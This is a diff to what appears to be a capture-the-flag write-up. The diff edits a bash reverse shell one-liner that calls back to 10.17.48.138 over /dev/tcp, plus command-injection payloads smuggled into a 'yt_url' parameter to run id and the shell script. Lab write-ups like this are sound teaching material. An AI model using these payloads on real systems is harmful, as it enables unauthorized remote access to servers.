@@ -138,7 +138,7 @@ yt_url=---;id;
 Now, create a simple a Bash reverse shell script.
 
 ```
-$ echo "bash -i >& /dev/tcp/10.17.48.138/9998 0>&1" > reverse_shell.sh
+$ echo "bash -i >& /dev/tcp/10.17.48.138/9999 0>&1" > reverse_shell.sh
 ```
 
 Let's set up a Python3 server on our machine.
@@ -168,7 +168,7 @@ listening on [any] 9999 ...
 Next, we have to execute the `reverse_shell.sh` file on the server using the following:
 
 ```
-yt_url=--;bashreverse_shell.sh
+yt_url=--;bash  reverse_shell.sh
 ```
 
 ![7](https://github.com/Knign/Write-ups/assets/110326359/5ea08a3e-4bc2-4556-803e-3beac14ee6f8)
